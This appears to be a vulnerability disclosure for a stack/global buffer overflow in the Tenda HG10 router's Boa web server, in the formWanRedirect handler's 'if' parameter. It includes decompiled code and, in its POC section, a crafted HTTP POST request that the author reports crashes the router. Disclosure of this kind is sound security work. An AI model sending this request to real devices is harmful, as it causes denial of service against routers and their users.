# TARGET

**Product:** Tenda HG10
 **Model:** AC1200 Dualband Wi-Fi xPON ONT
 **Vendor:** Tenda Technology
 **Official Website:** https://www.tendacn.com/
 **Firmware Version:** HG7_HG9_HG10re_300001138

# BUG TYPE

**Buffer Overflow Vulnerability**

# Abstract

A buffer overflow vulnerability exists in the Tenda HG10 AC1200 Dualband Wi-Fi xPON ONT router. The vulnerability is located in the Boa web server's `formWanRedirect` interface and is related to the handling of the `if` parameter. Because the user-controllable parameter is copied without sufficient length validation, a remote attacker can submit an overlong value through a crafted HTTP request. 

# Details

The Boa web server's `formWanRedirect` function was analyzed using IDA Pro.
The function entry address identified in the analysis is `0x00462E10`.
The `if` parameter is obtained from the HTTP request and later copied into a fixed-size buffer. The unsafe copy operation does not verify that the destination buffer is large enough for the supplied value, so an overlong request can overwrite adjacent memory.

Relevant code patterns observed in the disassembly include:

```c
strcpy(&unk_52DB70, result);
boaGetVar(a1, "if", "")
```

![analysis screenshot 1](bof-formWanRedirect-if.assets/image7.png)

# POC

The affected endpoint is `POST /boaform/formWanRedirect HTTP/1.1`.

The crafted request used during verification is shown below:

```http
POST /boaform/formWanRedirect HTTP/1.1
if=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&postSecurityFlag=30711
```

Before the attack, the target device is in a normal state.

The malicious request is sent to the target device using Burp Suite.

After the request is processed, the router stops responding, confirming a denial-of-service condition.

![poc screenshot 3](bof-formWanRedirect-if.assets/image3.png)

![poc screenshot 4](bof-formWanRedirect-if.assets/image4.png)

![poc screenshot 5](bof-formWanRedirect-if.assets/image5.png)

![poc screenshot 6](bof-formWanRedirect-if.assets/image6.png)

